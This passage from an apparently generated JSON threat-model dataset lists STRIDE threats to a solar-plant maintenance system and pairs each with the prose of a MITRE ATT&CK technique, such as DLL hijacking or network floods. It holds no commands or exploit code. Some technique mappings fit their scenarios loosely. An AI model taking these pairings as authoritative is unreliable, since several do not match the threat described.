            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Exploitation",
                "Vulnerability",
                "TOREADOR Platform"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disables the Dashboard, preventing employees from viewing system predictions.",
            "Assumptions": [
                {
                    "Assumption": "Dashboard does not have high availability measures.",
                    "Role": "System Architect",
                    "Condition": "Lack of availability measures increases risk."
                },
                {
                    "Assumption": "No mitigation strategies for disabling attacks.",
                    "Role": "Security Officer",
                    "Condition": "Absence allows for DOS attacks."
                },
                {
                    "Assumption": "Attacker has network access to target the Dashboard.",
                    "Role": "External Attacker",
                    "Condition": "Access facilitates attacks."
                }
            ],
            "Potential Impact": "Operational disruptions and delayed maintenance responses.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Dashboard",
                "Network Attack",
                "High Availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker elevates privileges by exploiting a vulnerability in the Receiver component.",
            "Assumptions": [
                {
                    "Assumption": "Receiver has known but unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched systems increase risk."
                },
                {
                    "Assumption": "User accounts are not restricted in privilege.",
                    "Role": "System Manager",
                    "Condition": "Lack of restrictions allows elevation."
                },
                {
                    "Assumption": "No monitoring for privilege escalation activities.",
                    "Role": "Security Officer",
                    "Condition": "Absence of monitoring facilitates attacks."
                }
            ],
            "Potential Impact": "Unauthorized control over components and data.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Vulnerability Exploitation",
                "Receiver",
                "System Compromise"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to the TOREADOR platform via compromised credentials.",
            "Assumptions": [
                {
                    "Assumption": "Weak password policies and reuse of passwords.",
                    "Role": "Employee",
                    "Condition": "Weak policies increase risk."
                },
                {
                    "Assumption": "No multi-factor authentication (MFA).",
                    "Role": "System Designer",
                    "Condition": "Absence of MFA allows elevation."
                },
                {
                    "Assumption": "Lack of stringent access control policies.",
                    "Role": "Security Officer",
                    "Condition": "Weak controls facilitate attacks."
                }
            ],
            "Potential Impact": "Full control over the platform's operations and data.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Credential Compromise",
                "Admin Access",
                "TOREADOR Platform"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a zero-day vulnerability in the Dashboard software to gain high-level access.",
            "Assumptions": [
                {
                    "Assumption": "Dashboard software contains critical vulnerabilities.",
                    "Role": "Software Developer",
                    "Condition": "Vulnerability presence increases risk."
                },
                {
                    "Assumption": "No security patches or updates applied.",
                    "Role": "System Administrator",
                    "Condition": "Lack of updates makes exploitation easier."
                },
                {
                    "Assumption": "Administrator access is not adequately protected.",
                    "Role": "Security Officer",
                    "Condition": "Weak protection facilitates privilege elevation."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and system control.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Zero-day Exploit",
                "Vulnerability",
                "Dashboard"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "11",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of sensors to send falsified data to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Attackers gain physical access or remote access to sensors.",
                    "Role": "Field Operator",
                    "Condition": "Weak physical security or unsecured network access"
                },
                {
                    "Assumption": "Lack of mutual authentication between sensors and the Data Logger.",
                    "Role": "Developer",
                    "Condition": "Authentication protocols are not implemented"
                }
            ],
            "Potential Impact": "Corruption of system data, leading to inaccurate predictive maintenance and power optimization.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "network",
                "injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker accesses the Dashboard using stolen credentials.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are stored insecurely or obtained through phishing.",
                    "Role": "User",
                    "Condition": "Users fall prey to phishing schemes."
                },
                {
                    "Assumption": "No multi-factor authentication (MFA) is in place.",
                    "Role": "System Administrator",
                    "Condition": "MFA is not enforced"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and potential manipulation of system settings.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credentials",
                "user",
                "dashboard"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker deceives the Anonymity Agent, causing it to accept and process malicious data.",
            "Assumptions": [
                {
                    "Assumption": "Anonymity Agent lacks robust data validation checks.",
                    "Role": "Developer",
                    "Condition": "Poor data validation implementation"
                },
                {
                    "Assumption": "Malicious actors can inject false metadata.",
                    "Role": "Attacker",
                    "Condition": "Weak endpoint protection"
                }
            ],
            "Potential Impact": "Introduction of corrupt data into the AI/ML model training pipeline.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "data injection",
                "model",
                "validation"
            ],
            "mitre_technique": {
                "name": "Component Object Model and Distributed COM",
                "description": "**This technique has been deprecated. Please use [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Component Object Model](https://attack.mitre.org/techniques/T1559/001).**\n\nAdversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. \n\nCOM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation: Microsoft Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.\n\nAdversaries may abuse COM for local command and/or payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific COM objects also exists to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors such as Privilege Escalation and Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)\n\nAdversaries may use DCOM for lateral movement. Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents (Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173) (DDE) execution directly through a COM created instance of a Microsoft Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.",
                "id": "attack-pattern--772bc7a8-a157-42cc-8728-d648e25c7fe7",
                "technique_id": "T1175"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters data in the Data Logger before transmission to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Attackers have physical or remote access to the Data Logger.",
                    "Role": "Field Operator",
                    "Condition": "Weak physical security or unsecured network access"
                },
                {
                    "Assumption": "Insufficient encryption of data in transit.",
                    "Role": "Developer",
                    "Condition": "No encryption protocols implemented"
                }
            ],
            "Potential Impact": "Compromise of data integrity and potential disruption in AI/ML model accuracy.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data",
                "network",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies pre-processed data before it reaches the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls on the Anonymity Agent.",
                    "Role": "System Administrator",
                    "Condition": "Lack of strict role-based access policies"
                },
                {
                    "Assumption": "Insufficient logging and monitoring of data anomalies.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of anomaly detection mechanisms"
                }
            ],
            "Potential Impact": "Corruption of AI/ML models, leading to faulty predictions and maintenance schedules.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "model",
                "access control"
            ],
            "mitre_technique": {
                "name": "Windows File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
                "id": "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee",
                "technique_id": "T1222.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider modifies the metadata related to solar power plants.",
            "Assumptions": [
                {
                    "Assumption": "Insider has authorized access but misuses it.",
                    "Role": "Internal Employee",
                    "Condition": "Insufficient auditing of user actions"
                },
                {
                    "Assumption": "No version control for metadata.",
                    "Role": "Data Manager",
                    "Condition": "Lack of systematic version tracking"
                }
            ],
            "Potential Impact": "Misleading data context leading to inaccurate AI/ML model outcomes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "metadata",
                "insider threat",
                "auditing"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies making changes to the predictive models.",
            "Assumptions": [
                {
                    "Assumption": "System lacks proper logging of user activities.",
                    "Role": "System Administrator",
                    "Condition": "No proper activity logging and audit trails"
                },
                {
                    "Assumption": "Multi-user environment with no clear track of user changes.",
                    "Role": "Team Leader",
                    "Condition": "Lack of individual accountability mechanisms"
                }
            ],
            "Potential Impact": "Difficulties in tracking actions and resolving discrepancies, compromising system trust.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logs",
                "audit trails",
                "multi-user"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A remote attacker denies initiating denial-of-service attacks.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate network monitoring.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of intrusion detection mechanisms"
                },
                {
                    "Assumption": "Lack of sufficient logging of network activities.",
                    "Role": "System Administrator",
                    "Condition": "No proper network activity logging"
                }
            ],
            "Potential Impact": "Difficulty in identifying the source of attack, leading to prolonged service disruption.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "network",
                "logging",
                "denial-of-service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An internal user fabricates data and denies responsibility.",
            "Assumptions": [
                {
                    "Assumption": "Lack of data integrity checks and audits.",
                    "Role": "Data Manager",
                    "Condition": "No robust integrity verification mechanisms"
                },
                {
                    "Assumption": "No digital signatures for data.",
                    "Role": "Developer",
                    "Condition": "Absence of data signing"
                }
            ],
            "Potential Impact": "Challenges in establishing accountability and ensuring data authenticity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data fabrication",
                "accountability",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data interception during transmission from Data Logger to Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Data is not encrypted in transit.",
                    "Role": "Developer",
                    "Condition": "No encryption protocols implemented"
                },
                {
                    "Assumption": "Network is not secured (e.g., lack of VPN).",
                    "Role": "Network Administrator",
                    "Condition": "No secure communication channels"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "network",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unsecured metadata containing sensitive information is accessed by unauthorized personnel.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access control mechanisms for metadata.",
                    "Role": "System Administrator",
                    "Condition": "Weak role-based access policies"
                },
                {
                    "Assumption": "No encryption for metadata storage.",
                    "Role": "Data Manager",
                    "Condition": "Lack of encryption protocols"
                }
            ],
            "Potential Impact": "Exposure of sensitive contextual data, potentially compromising operational security.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "metadata",
                "access control",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
